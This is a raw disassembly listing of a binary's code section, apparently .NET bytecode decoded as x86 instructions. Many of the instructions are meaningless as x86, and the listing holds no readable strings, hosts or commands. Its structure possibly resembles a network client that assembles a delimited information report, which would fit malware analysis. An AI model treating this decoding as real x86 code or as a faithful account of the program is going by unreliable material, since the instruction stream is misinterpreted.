  4036f2:	47                   	inc    %edi
  4036f3:	00 00                	add    %al,(%eax)
  4036f5:	06                   	push   %es
  4036f6:	73 73                	jae    0x40376b
  4036f8:	00 00                	add    %al,(%eax)
  4036fa:	0a 25 80 2b 00 00    	or     0x2b80,%ah
  403700:	04 73                	add    $0x73,%al
  403702:	74 00                	je     0x403704
  403704:	00 0a                	add    %cl,(%edx)
  403706:	07                   	pop    %es
  403707:	17                   	pop    %ss
  403708:	8d 07                	lea    (%edi),%eax
  40370a:	00 00                	add    %al,(%eax)
  40370c:	01 25 16 16 8c 59    	add    %esp,0x598c1616
  403712:	00 00                	add    %al,(%eax)
  403714:	01 a2 14 28 a1 00    	add    %esp,0xa12814(%edx)
  40371a:	00 0a                	add    %cl,(%edx)
  40371c:	28 11                	sub    %dl,(%ecx)
  40371e:	00 00                	add    %al,(%eax)
  403720:	0a 6f 76             	or     0x76(%edi),%ch
  403723:	00 00                	add    %al,(%eax)
  403725:	0a 7e 22             	or     0x22(%esi),%bh
  403728:	00 00                	add    %al,(%eax)
  40372a:	04 6f                	add    $0x6f,%al
  40372c:	3c 00                	cmp    $0x0,%al
  40372e:	00 0a                	add    %cl,(%edx)
  403730:	73 36                	jae    0x403768
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 80 22 00 00 04    	or     0x4000022(%eax),%al
  40373a:	07                   	pop    %es
  40373b:	6f                   	outsl  %ds:(%esi),(%dx)
  40373c:	a2 00 00 0a 18       	mov    %al,0x180a0000
  403741:	33 5a 7e             	xor    0x7e(%edx),%ebx
  403744:	22 00                	and    (%eax),%al
  403746:	00 04 07             	add    %al,(%edi,%eax,1)
  403749:	17                   	pop    %ss
  40374a:	8d 07                	lea    (%edi),%eax
  40374c:	00 00                	add    %al,(%eax)
  40374e:	01 25 16 17 8c 59    	add    %esp,0x598c1716
  403754:	00 00                	add    %al,(%eax)
  403756:	01 a2 14 28 a1 00    	add    %esp,0xa12814(%edx)
  40375c:	00 0a                	add    %cl,(%edx)
  40375e:	74 0a                	je     0x40376a
  403760:	00 00                	add    %al,(%eax)
  403762:	1b 16                	sbb    (%esi),%edx
  403764:	07                   	pop    %es
  403765:	17                   	pop    %ss
  403766:	8d 07                	lea    (%edi),%eax
  403768:	00 00                	add    %al,(%eax)
  40376a:	01 25 16 17 8c 59    	add    %esp,0x598c1716
  403770:	00 00                	add    %al,(%eax)
  403772:	01 a2 14 28 a1 00    	add    %esp,0xa12814(%edx)
  403778:	00 0a                	add    %cl,(%edx)
  40377a:	14 72                	adc    $0x72,%al
  40377c:	d8 07                	fadds  (%edi)
  40377e:	00 70 16             	add    %dh,0x16(%eax)
  403781:	8d 07                	lea    (%edi),%eax
  403783:	00 00                	add    %al,(%eax)
  403785:	01 14 14             	add    %edx,(%esp,%edx,1)
  403788:	14 28                	adc    $0x28,%al
  40378a:	a3 00 00 0a 28       	mov    %eax,0x280a0000
  40378f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403790:	00 00                	add    %al,(%eax)
  403792:	0a 6f 39             	or     0x39(%edi),%ch
  403795:	00 00                	add    %al,(%eax)
  403797:	0a 38                	or     (%eax),%bh
  403799:	0d ff ff ff dd       	or     $0xddffffff,%eax
  40379e:	6a fe                	push   $0xfffffffe
  4037a0:	ff                   	(bad)
  4037a1:	ff 25 28 2c 00 00    	jmp    *0x2c28
  4037a7:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  4037aa:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  4037af:	00 16                	add    %dl,(%esi)
  4037b1:	80 21 00             	andb   $0x0,(%ecx)
  4037b4:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  4037b7:	1a 7e 1f             	sbb    0x1f(%esi),%bh
  4037ba:	00 00                	add    %al,(%eax)
  4037bc:	04 20                	add    $0x20,%al
  4037be:	88 13                	mov    %dl,(%ebx)
  4037c0:	00 00                	add    %al,(%eax)
  4037c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4037c4:	00 00                	add    %al,(%eax)
  4037c6:	0a 28                	or     (%eax),%ch
  4037c8:	77 00                	ja     0x4037ca
  4037ca:	00 0a                	add    %cl,(%edx)
  4037cc:	28 41 00             	sub    %al,0x0(%ecx)
  4037cf:	00 06                	add    %al,(%esi)
  4037d1:	26 7e 21             	es jle 0x4037f5
  4037d4:	00 00                	add    %al,(%eax)
  4037d6:	04 2c                	add    $0x2c,%al
  4037d8:	df 28                	fildll (%eax)
  4037da:	40                   	inc    %eax
  4037db:	00 00                	add    %al,(%eax)
  4037dd:	06                   	push   %es
  4037de:	2a 00                	sub    (%eax),%al
  4037e0:	41                   	inc    %ecx
  4037e1:	1c 00                	sbb    $0x0,%al
  4037e3:	00 00                	add    %al,(%eax)
  4037e5:	00 00                	add    %al,(%eax)
  4037e7:	00 01                	add    %al,(%ecx)
  4037e9:	00 00                	add    %al,(%eax)
  4037eb:	00 95 01 00 00 96    	add    %dl,-0x69ffffff(%ebp)
  4037f1:	01 00                	add    %eax,(%eax)
  4037f3:	00 0e                	add    %cl,(%esi)
  4037f5:	00 00                	add    %al,(%eax)
  4037f7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4037fa:	00 01                	add    %al,(%ecx)
  4037fc:	1b 30                	sbb    (%eax),%esi
  4037fe:	07                   	pop    %es
  4037ff:	00 fe                	add    %bh,%dh
  403801:	02 00                	add    (%eax),%al
  403803:	00 13                	add    %dl,(%ebx)
  403805:	00 00                	add    %al,(%eax)
  403807:	11 16                	adc    %edx,(%esi)
  403809:	80 21 00             	andb   $0x0,(%ecx)
  40380c:	00 04 7e             	add    %al,(%esi,%edi,2)
  40380f:	1e                   	push   %ds
  403810:	00 00                	add    %al,(%eax)
  403812:	04 6f                	add    $0x6f,%al
  403814:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403815:	00 00                	add    %al,(%eax)
  403817:	0a de                	or     %dh,%bl
  403819:	0e                   	push   %cs
  40381a:	25 28 2c 00 00       	and    $0x2c28,%eax
  40381f:	0a 0b                	or     (%ebx),%cl
  403821:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  403827:	00 00                	add    %al,(%eax)
  403829:	7e 23                	jle    0x40384e
  40382b:	00 00                	add    %al,(%eax)
  40382d:	04 6f                	add    $0x6f,%al
  40382f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403830:	00 00                	add    %al,(%eax)
  403832:	0a de                	or     %dh,%bl
  403834:	0e                   	push   %cs
  403835:	25 28 2c 00 00       	and    $0x2c28,%eax
  40383a:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  40383d:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  403842:	00 00                	add    %al,(%eax)
  403844:	7e 22                	jle    0x403868
  403846:	00 00                	add    %al,(%eax)
  403848:	04 6f                	add    $0x6f,%al
  40384a:	3c 00                	cmp    $0x0,%al
  40384c:	00 0a                	add    %cl,(%edx)
  40384e:	de 0e                	fimuls (%esi)
  403850:	25 28 2c 00 00       	and    $0x2c28,%eax
  403855:	0a 0d 28 2d 00 00    	or     0x2d28,%cl
  40385b:	0a de                	or     %dh,%bl
  40385d:	00 00                	add    %al,(%eax)
  40385f:	73 a8                	jae    0x403809
  403861:	00 00                	add    %al,(%eax)
  403863:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403869:	7e 1e                	jle    0x403889
  40386b:	00 00                	add    %al,(%eax)
  40386d:	04 20                	add    $0x20,%al
  40386f:	00 20                	add    %ah,(%eax)
  403871:	4e                   	dec    %esi
  403872:	00 6f a9             	add    %ch,-0x57(%edi)
  403875:	00 00                	add    %al,(%eax)
  403877:	0a 7e 1e             	or     0x1e(%esi),%bh
  40387a:	00 00                	add    %al,(%eax)
  40387c:	04 20                	add    $0x20,%al
  40387e:	00 20                	add    %ah,(%eax)
  403880:	4e                   	dec    %esi
  403881:	00 6f aa             	add    %ch,-0x56(%edi)
  403884:	00 00                	add    %al,(%eax)
  403886:	0a 7e 1e             	or     0x1e(%esi),%bh
  403889:	00 00                	add    %al,(%eax)
  40388b:	04 15                	add    $0x15,%al
  40388d:	6f                   	outsl  %ds:(%esi),(%dx)
  40388e:	ab                   	stos   %eax,%es:(%edi)
  40388f:	00 00                	add    %al,(%eax)
  403891:	0a 7e 1e             	or     0x1e(%esi),%bh
  403894:	00 00                	add    %al,(%eax)
  403896:	04 15                	add    $0x15,%al
  403898:	6f                   	outsl  %ds:(%esi),(%dx)
  403899:	ac                   	lods   %ds:(%esi),%al
  40389a:	00 00                	add    %al,(%eax)
  40389c:	0a 73 ad             	or     -0x53(%ebx),%dh
  40389f:	00 00                	add    %al,(%eax)
  4038a1:	0a 13                	or     (%ebx),%dl
  4038a3:	05 72 7f 00 00       	add    $0x7f72,%eax
  4038a8:	70 72                	jo     0x40391c
  4038aa:	7f 00                	jg     0x4038ac
  4038ac:	00 70 73             	add    %dh,0x73(%eax)
  4038af:	ae                   	scas   %es:(%edi),%al
  4038b0:	00 00                	add    %al,(%eax)
  4038b2:	0a 13                	or     (%ebx),%dl
  4038b4:	06                   	push   %es
  4038b5:	11 05 11 06 6f af    	adc    %eax,0xaf6f0611
  4038bb:	00 00                	add    %al,(%eax)
  4038bd:	0a 11                	or     (%ecx),%dl
  4038bf:	05 14 72 e6 07       	add    $0x7e67214,%eax
  4038c4:	00 70 17             	add    %dh,0x17(%eax)
  4038c7:	8d 07                	lea    (%edi),%eax
  4038c9:	00 00                	add    %al,(%eax)
  4038cb:	01 25 16 7e 08 00    	add    %esp,0x87e16
  4038d1:	00 04 28             	add    %al,(%eax,%ebp,1)
  4038d4:	4b                   	dec    %ebx
  4038d5:	00 00                	add    %al,(%eax)
  4038d7:	06                   	push   %es
  4038d8:	a2 14 14 14 28       	mov    %al,0x28141414
  4038dd:	a3 00 00 0a 28       	mov    %eax,0x280a0000
  4038e2:	33 00                	xor    (%eax),%eax
  4038e4:	00 0a                	add    %cl,(%edx)
  4038e6:	72 04                	jb     0x4038ec
  4038e8:	08 00                	or     %al,(%eax)
  4038ea:	70 15                	jo     0x403901
  4038ec:	16                   	push   %ss
  4038ed:	28 37                	sub    %dh,(%edi)
  4038ef:	00 00                	add    %al,(%eax)
  4038f1:	0a 13                	or     (%ebx),%dl
  4038f3:	07                   	pop    %es
  4038f4:	11 07                	adc    %eax,(%edi)
  4038f6:	16                   	push   %ss
  4038f7:	9a 80 09 00 00 04 73 	lcall  $0x7304,$0x980
  4038fe:	98                   	cwtl
  4038ff:	00 00                	add    %al,(%eax)
  403901:	0a 26                	or     (%esi),%ah
  403903:	11 07                	adc    %eax,(%edi)
  403905:	73 98                	jae    0x40389f
  403907:	00 00                	add    %al,(%eax)
  403909:	0a 17                	or     (%edi),%dl
  40390b:	11 07                	adc    %eax,(%edi)
  40390d:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403910:	b0 00                	mov    $0x0,%al
  403912:	00 0a                	add    %cl,(%edx)
  403914:	9a 28 7b 00 00 0a 80 	lcall  $0x800a,$0x7b28
  40391b:	0a 00                	or     (%eax),%al
  40391d:	00 04 11             	add    %al,(%ecx,%edx,1)
  403920:	05 6f b1 00 00       	add    $0xb16f,%eax
  403925:	0a de                	or     %dh,%bl
  403927:	0f 25                	(bad)
  403929:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40392c:	00 0a                	add    %cl,(%edx)
  40392e:	13 08                	adc    (%eax),%ecx
  403930:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  403936:	00 de                	add    %bl,%dh
  403938:	0c 11                	or     $0x11,%al
  40393a:	05 2c 07 11 05       	add    $0x511072c,%eax
  40393f:	6f                   	outsl  %ds:(%esi),(%dx)
  403940:	44                   	inc    %esp
  403941:	00 00                	add    %al,(%eax)
  403943:	0a dc                	or     %ah,%bl
  403945:	7e 1e                	jle    0x403965
  403947:	00 00                	add    %al,(%eax)
  403949:	04 7e                	add    $0x7e,%al
  40394b:	09 00                	or     %eax,(%eax)
  40394d:	00 04 7e             	add    %al,(%esi,%edi,2)
  403950:	0a 00                	or     (%eax),%al
  403952:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403955:	b2 00                	mov    $0x0,%dl
  403957:	00 0a                	add    %cl,(%edx)
  403959:	17                   	pop    %ss
  40395a:	80 21 00             	andb   $0x0,(%ecx)
  40395d:	00 04 73             	add    %al,(%ebx,%esi,2)
  403960:	36 00 00             	add    %al,%ss:(%eax)
  403963:	0a 80 22 00 00 04    	or     0x4000022(%eax),%al
  403969:	1f                   	pop    %ds
  40396a:	21 8d 07 00 00 01    	and    %ecx,0x1000007(%ebp)
  403970:	25 16 72 08 08       	and    $0x8087216,%eax
  403975:	00 70 a2             	add    %dh,-0x5e(%eax)
  403978:	25 17 7e 1d 00       	and    $0x1d7e17,%eax
  40397d:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403980:	25 18 28 25 00       	and    $0x252818,%eax
  403985:	00 06                	add    %al,(%esi)
  403987:	a2 25 19 7e 1d       	mov    %al,0x1d7e1925
  40398c:	00 00                	add    %al,(%eax)
  40398e:	04 a2                	add    $0xa2,%al
  403990:	25 1a 28 21 00       	and    $0x21281a,%eax
  403995:	00 06                	add    %al,(%esi)
  403997:	a2 25 1b 7e 1d       	mov    %al,0x1d7e1b25
  40399c:	00 00                	add    %al,(%eax)
  40399e:	04 a2                	add    $0xa2,%al
  4039a0:	25 1c 72 12 08       	and    $0x812721c,%eax
  4039a5:	00 70 a2             	add    %dh,-0x5e(%eax)
  4039a8:	25 1d 7e 1d 00       	and    $0x1d7e1d,%eax
  4039ad:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4039b0:	25 1e 28 22 00       	and    $0x22281e,%eax
  4039b5:	00 06                	add    %al,(%esi)
  4039b7:	a2 25 1f 09 72       	mov    %al,0x72091f25
  4039bc:	b7 01                	mov    $0x1,%bh
  4039be:	00 70 a2             	add    %dh,-0x5e(%eax)
  4039c1:	25 1f 0a 28 23       	and    $0x23280a1f,%eax
  4039c6:	00 00                	add    %al,(%eax)
  4039c8:	06                   	push   %es
  4039c9:	a2 25 1f 0b 7e       	mov    %al,0x7e0b1f25
  4039ce:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  4039d3:	25 1f 0c 28 24       	and    $0x24280c1f,%eax
  4039d8:	00 00                	add    %al,(%eax)
  4039da:	06                   	push   %es
  4039db:	a2 25 1f 0d 7e       	mov    %al,0x7e0d1f25
  4039e0:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  4039e5:	25 1f 0e 28 2a       	and    $0x2a280e1f,%eax
  4039ea:	00 00                	add    %al,(%eax)
  4039ec:	06                   	push   %es
  4039ed:	a2 25 1f 0f 7e       	mov    %al,0x7e0f1f25
  4039f2:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  4039f7:	25 1f 10 28 28       	and    $0x2828101f,%eax
  4039fc:	00 00                	add    %al,(%eax)
  4039fe:	06                   	push   %es
  4039ff:	a2 25 1f 11 7e       	mov    %al,0x7e111f25
  403a04:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  403a09:	25 1f 12 28 2c       	and    $0x2c28121f,%eax
  403a0e:	00 00                	add    %al,(%eax)
  403a10:	06                   	push   %es
  403a11:	a2 25 1f 13 7e       	mov    %al,0x7e131f25
  403a16:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  403a1b:	25 1f 14 28 29       	and    $0x2928141f,%eax
  403a20:	00 00                	add    %al,(%eax)
  403a22:	06                   	push   %es
  403a23:	a2 25 1f 15 7e       	mov    %al,0x7e151f25
  403a28:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  403a2d:	25 1f 16 7e 0a       	and    $0xa7e161f,%eax
  403a32:	00 00                	add    %al,(%eax)
  403a34:	04 8c                	add    $0x8c,%al
  403a36:	59                   	pop    %ecx
  403a37:	00 00                	add    %al,(%eax)
  403a39:	01 a2 25 1f 17 7e    	add    %esp,0x7e171f25(%edx)
  403a3f:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  403a44:	25 1f 18 28 2f       	and    $0x2f28181f,%eax
  403a49:	00 00                	add    %al,(%eax)
  403a4b:	06                   	push   %es
  403a4c:	a2 25 1f 19 7e       	mov    %al,0x7e191f25
  403a51:	1d 00 00 04 a2       	sbb    $0xa2040000,%eax
  403a56:	25 1f 1a 72 24       	and    $0x24721a1f,%eax
  403a5b:	08 00                	or     %al,(%eax)
  403a5d:	70 a2                	jo     0x403a01
  403a5f:	25 1f 1b 7e 1d       	and    $0x1d7e1b1f,%eax
  403a64:	00 00                	add    %al,(%eax)
  403a66:	04 a2                	add    $0xa2,%al
  403a68:	25 1f 1c 72 b7       	and    $0xb7721c1f,%eax
  403a6d:	01 00                	add    %eax,(%eax)
  403a6f:	70 a2                	jo     0x403a13
  403a71:	25 1f 1d 7e 1d       	and    $0x1d7e1d1f,%eax
  403a76:	00 00                	add    %al,(%eax)
  403a78:	04 a2                	add    $0xa2,%al
  403a7a:	25 1f 1e 28 2b       	and    $0x2b281e1f,%eax
  403a7f:	00 00                	add    %al,(%eax)
  403a81:	06                   	push   %es
  403a82:	13 09                	adc    (%ecx),%ecx
  403a84:	12 09                	adc    (%ecx),%cl
  403a86:	28 b3 00 00 0a a2    	sub    %dh,-0x5df60000(%ebx)
  403a8c:	25 1f 1f 7e 1d       	and    $0x1d7e1f1f,%eax
  403a91:	00 00                	add    %al,(%eax)
  403a93:	04 a2                	add    $0xa2,%al
  403a95:	25 1f 20 7e 16       	and    $0x167e201f,%eax
  403a9a:	00 00                	add    %al,(%eax)
  403a9c:	04 a2                	add    $0xa2,%al
  403a9e:	28 b4 00 00 0a 28 43 	sub    %dh,0x43280a00(%eax,%eax,1)
  403aa5:	00 00                	add    %al,(%eax)
  403aa7:	06                   	push   %es
  403aa8:	7e 2c                	jle    0x403ad6
  403aaa:	00 00                	add    %al,(%eax)
  403aac:	04 2c                	add    $0x2c,%al
  403aae:	07                   	pop    %es
  403aaf:	7e 2c                	jle    0x403add
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	04 2b                	add    $0x2b,%al
  403ab5:	16                   	push   %ss
  403ab6:	7e 2a                	jle    0x403ae2
  403ab8:	00 00                	add    %al,(%eax)
  403aba:	04 fe                	add    $0xfe,%al
  403abc:	06                   	push   %es
  403abd:	48                   	dec    %eax
  403abe:	00 00                	add    %al,(%eax)
  403ac0:	06                   	push   %es
  403ac1:	73 b5                	jae    0x403a78
  403ac3:	00 00                	add    %al,(%eax)
  403ac5:	0a 25 80 2c 00 00    	or     0x2c80,%ah
  403acb:	04 13                	add    $0x13,%al
  403acd:	04 11                	add    $0x11,%al
  403acf:	04 14                	add    $0x14,%al
  403ad1:	16                   	push   %ss
  403ad2:	17                   	pop    %ss
  403ad3:	73 b6                	jae    0x403a8b
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  403add:	7e 21                	jle    0x403b00
  403adf:	00 00                	add    %al,(%eax)
  403ae1:	04 8c                	add    $0x8c,%al
  403ae3:	22 00                	and    (%eax),%al
  403ae5:	00 01                	add    %al,(%ecx)
  403ae7:	0a de                	or     %dh,%bl
  403ae9:	1a 25 28 2c 00 00    	sbb    0x2c28,%ah
  403aef:	0a 13                	or     (%ebx),%dl
  403af1:	0a 7e 21             	or     0x21(%esi),%bh
  403af4:	00 00                	add    %al,(%eax)
  403af6:	04 8c                	add    $0x8c,%al
  403af8:	22 00                	and    (%eax),%al
  403afa:	00 01                	add    %al,(%ecx)
  403afc:	0a 28                	or     (%eax),%ch
  403afe:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  403b03:	00 06                	add    %al,(%esi)
  403b05:	2a 00                	sub    (%eax),%al
  403b07:	00 41 94             	add    %al,-0x6c(%ecx)
  403b0a:	00 00                	add    %al,(%eax)
  403b0c:	00 00                	add    %al,(%eax)
  403b0e:	00 00                	add    %al,(%eax)
  403b10:	06                   	push   %es
  403b11:	00 00                	add    %al,(%eax)
  403b13:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403b16:	00 00                	add    %al,(%eax)
  403b18:	12 00                	adc    (%eax),%al
  403b1a:	00 00                	add    %al,(%eax)
  403b1c:	0e                   	push   %cs
  403b1d:	00 00                	add    %al,(%eax)
  403b1f:	00 14 00             	add    %dl,(%eax,%eax,1)
  403b22:	00 01                	add    %al,(%ecx)
  403b24:	00 00                	add    %al,(%eax)
  403b26:	00 00                	add    %al,(%eax)
  403b28:	21 00                	and    %eax,(%eax)
  403b2a:	00 00                	add    %al,(%eax)
  403b2c:	0c 00                	or     $0x0,%al
  403b2e:	00 00                	add    %al,(%eax)
  403b30:	2d 00 00 00 0e       	sub    $0xe000000,%eax
  403b35:	00 00                	add    %al,(%eax)
  403b37:	00 14 00             	add    %dl,(%eax,%eax,1)
  403b3a:	00 01                	add    %al,(%ecx)
  403b3c:	00 00                	add    %al,(%eax)
  403b3e:	00 00                	add    %al,(%eax)
  403b40:	3c 00                	cmp    $0x0,%al
  403b42:	00 00                	add    %al,(%eax)
  403b44:	0c 00                	or     $0x0,%al
  403b46:	00 00                	add    %al,(%eax)
  403b48:	48                   	dec    %eax
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 0e                	add    %cl,(%esi)
  403b4d:	00 00                	add    %al,(%eax)
  403b4f:	00 14 00             	add    %dl,(%eax,%eax,1)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	00 00                	add    %al,(%eax)
  403b56:	00 00                	add    %al,(%eax)
  403b58:	9c                   	pushf
  403b59:	00 00                	add    %al,(%eax)
  403b5b:	00 84 00 00 00 20 01 	add    %al,0x1200000(%eax,%eax,1)
  403b62:	00 00                	add    %al,(%eax)
  403b64:	0f 00 00             	sldt   (%eax)
  403b67:	00 14 00             	add    %dl,(%eax,%eax,1)
  403b6a:	00 01                	add    %al,(%ecx)
  403b6c:	02 00                	add    (%eax),%al
  403b6e:	00 00                	add    %al,(%eax)
  403b70:	9c                   	pushf
  403b71:	00 00                	add    %al,(%eax)
  403b73:	00 95 00 00 00 31    	add    %dl,0x31000000(%ebp)
  403b79:	01 00                	add    %eax,(%eax)
  403b7b:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  403b86:	00 00                	add    %al,(%eax)
  403b88:	57                   	push   %edi
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	00 8b 02 00 00 e2    	add    %cl,-0x1dfffffe(%ebx)
  403b91:	02 00                	add    (%eax),%al
  403b93:	00 1a                	add    %bl,(%edx)
  403b95:	00 00                	add    %al,(%eax)
  403b97:	00 14 00             	add    %dl,(%eax,%eax,1)
  403b9a:	00 01                	add    %al,(%ecx)
  403b9c:	1b 30                	sbb    (%eax),%esi
  403b9e:	05 00 8f 00 00       	add    $0x8f00,%eax
  403ba3:	00 14 00             	add    %dl,(%eax,%eax,1)
  403ba6:	00 11                	add    %dl,(%ecx)
  403ba8:	73 36                	jae    0x403be0
  403baa:	00 00                	add    %al,(%eax)
  403bac:	0a 0a                	or     (%edx),%cl
  403bae:	06                   	push   %es
  403baf:	02 16                	add    (%esi),%dl
  403bb1:	02 8e 69 6f 39 00    	add    0x396f69(%esi),%cl
  403bb7:	00 0a                	add    %cl,(%edx)
  403bb9:	06                   	push   %es
  403bba:	7e 1c                	jle    0x403bd8
  403bbc:	00 00                	add    %al,(%eax)
  403bbe:	04 28                	add    $0x28,%al
  403bc0:	14 00                	adc    $0x0,%al
  403bc2:	00 06                	add    %al,(%esi)
  403bc4:	16                   	push   %ss
  403bc5:	7e 1c                	jle    0x403be3
  403bc7:	00 00                	add    %al,(%eax)
  403bc9:	04 6f                	add    $0x6f,%al
  403bcb:	38 00                	cmp    %al,(%eax)
  403bcd:	00 0a                	add    %cl,(%edx)
  403bcf:	6f                   	outsl  %ds:(%esi),(%dx)
  403bd0:	39 00                	cmp    %eax,(%eax)
  403bd2:	00 0a                	add    %cl,(%edx)
  403bd4:	7e 1e                	jle    0x403bf4
  403bd6:	00 00                	add    %al,(%eax)
  403bd8:	04 0b                	add    $0xb,%al
  403bda:	07                   	pop    %es
  403bdb:	28 b7 00 00 0a 7e    	sub    %dh,0x7e0a0000(%edi)
  403be1:	1e                   	push   %ds
  403be2:	00 00                	add    %al,(%eax)
  403be4:	04 6f                	add    $0x6f,%al
  403be6:	9c                   	pushf
  403be7:	00 00                	add    %al,(%eax)
  403be9:	0a 15 17 6f 9d 00    	or     0x9d6f17,%dl
  403bef:	00 0a                	add    %cl,(%edx)
  403bf1:	26 7e 1e             	es jle 0x403c12
  403bf4:	00 00                	add    %al,(%eax)
  403bf6:	04 6f                	add    $0x6f,%al
  403bf8:	9c                   	pushf
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	0a 06                	or     (%esi),%al
  403bfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403bfe:	3a 00                	cmp    (%eax),%al
  403c00:	00 0a                	add    %cl,(%edx)
  403c02:	16                   	push   %ss
  403c03:	06                   	push   %es
  403c04:	6f                   	outsl  %ds:(%esi),(%dx)
  403c05:	42                   	inc    %edx
  403c06:	00 00                	add    %al,(%eax)
  403c08:	0a b7 16 6f b8 00    	or     0xb86f16(%edi),%dh
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	26 de 07             	fiadds %es:(%edi)
  403c13:	07                   	pop    %es
  403c14:	28 b9 00 00 0a dc    	sub    %bh,-0x23f60000(%ecx)
  403c1a:	06                   	push   %es
  403c1b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c1c:	3c 00                	cmp    $0x0,%al
  403c1e:	00 0a                	add    %cl,(%edx)
  403c20:	de 14 25 28 2c 00 00 	ficoms 0x2c28(,%eiz,1)
  403c27:	0a 0c 16             	or     (%esi,%edx,1),%cl
  403c2a:	80 21 00             	andb   $0x0,(%ecx)
  403c2d:	00 04 28             	add    %al,(%eax,%ebp,1)
  403c30:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  403c35:	00 2a                	add    %ch,(%edx)
  403c37:	00 01                	add    %al,(%ecx)
  403c39:	1c 00                	sbb    $0x0,%al
  403c3b:	00 02                	add    %al,(%edx)
  403c3d:	00 38                	add    %bh,(%eax)
  403c3f:	00 33                	add    %dh,(%ebx)
  403c41:	6b 00 07             	imul   $0x7,(%eax),%eax
  403c44:	00 00                	add    %al,(%eax)
  403c46:	00 00                	add    %al,(%eax)
  403c48:	00 00                	add    %al,(%eax)
  403c4a:	06                   	push   %es
  403c4b:	00 74 7a 00          	add    %dh,0x0(%edx,%edi,2)
  403c4f:	14 14                	adc    $0x14,%al
  403c51:	00 00                	add    %al,(%eax)
  403c53:	01 5a 02             	add    %ebx,0x2(%edx)
  403c56:	28 4a 00             	sub    %cl,0x0(%edx)
  403c59:	00 06                	add    %al,(%esi)
  403c5b:	28 33                	sub    %dh,(%ebx)
  403c5d:	00 00                	add    %al,(%eax)
  403c5f:	0a 28                	or     (%eax),%ch
  403c61:	14 00                	adc    $0x0,%al
  403c63:	00 06                	add    %al,(%esi)
  403c65:	28 42 00             	sub    %al,0x0(%edx)
  403c68:	00 06                	add    %al,(%esi)
  403c6a:	2a 00                	sub    (%eax),%al
  403c6c:	0b 30                	or     (%eax),%esi
  403c6e:	03 00                	add    (%eax),%eax
  403c70:	81 00 00 00 00 00    	addl   $0x0,(%eax)
  403c76:	00 00                	add    %al,(%eax)
  403c78:	7e 27                	jle    0x403ca1
  403c7a:	00 00                	add    %al,(%eax)
  403c7c:	04 2c                	add    $0x2c,%al
  403c7e:	0c 7e                	or     $0x7e,%al
  403c80:	28 00                	sub    %al,(%eax)
  403c82:	00 04 17             	add    %al,(%edi,%edx,1)
  403c85:	d6                   	salc
  403c86:	80 28 00             	subb   $0x0,(%eax)
  403c89:	00 04 7e             	add    %al,(%esi,%edi,2)
  403c8c:	26 00 00             	add    %al,%es:(%eax)
  403c8f:	04 2c                	add    $0x2c,%al
  403c91:	30 16                	xor    %dl,(%esi)
  403c93:	80 27 00             	andb   $0x0,(%edi)
  403c96:	00 04 16             	add    %al,(%esi,%edx,1)
  403c99:	80 26 00             	andb   $0x0,(%esi)
  403c9c:	00 04 72             	add    %al,(%edx,%esi,2)
  403c9f:	40                   	inc    %eax
  403ca0:	07                   	pop    %es
  403ca1:	00 70 7e             	add    %dh,0x7e(%eax)
  403ca4:	1d 00 00 04 7f       	sbb    $0x7f040000,%eax
  403ca9:	28 00                	sub    %al,(%eax)
  403cab:	00 04 28             	add    %al,(%eax,%ebp,1)
  403cae:	ba 00 00 0a 28       	mov    $0x280a0000,%edx
  403cb3:	51                   	push   %ecx
  403cb4:	00 00                	add    %al,(%eax)
  403cb6:	0a 28                	or     (%eax),%ch
  403cb8:	43                   	inc    %ebx
  403cb9:	00 00                	add    %al,(%eax)
  403cbb:	06                   	push   %es
  403cbc:	16                   	push   %ss
  403cbd:	80 28 00             	subb   $0x0,(%eax)
  403cc0:	00 04 7e             	add    %al,(%esi,%edi,2)
  403cc3:	29 00                	sub    %eax,(%eax)
  403cc5:	00 04 17             	add    %al,(%edi,%edx,1)
  403cc8:	d6                   	salc
  403cc9:	80 29 00             	subb   $0x0,(%ecx)
  403ccc:	00 04 7e             	add    %al,(%esi,%edi,2)
  403ccf:	29 00                	sub    %eax,(%eax)
  403cd1:	00 04 20             	add    %al,(%eax,%eiz,1)
  403cd4:	88 13                	mov    %dl,(%ebx)
  403cd6:	00 00                	add    %al,(%eax)
  403cd8:	31 10                	xor    %edx,(%eax)
  403cda:	16                   	push   %ss
  403cdb:	80 29 00             	subb   $0x0,(%ecx)
  403cde:	00 04 72             	add    %al,(%edx,%esi,2)
  403ce1:	2c 08                	sub    $0x8,%al
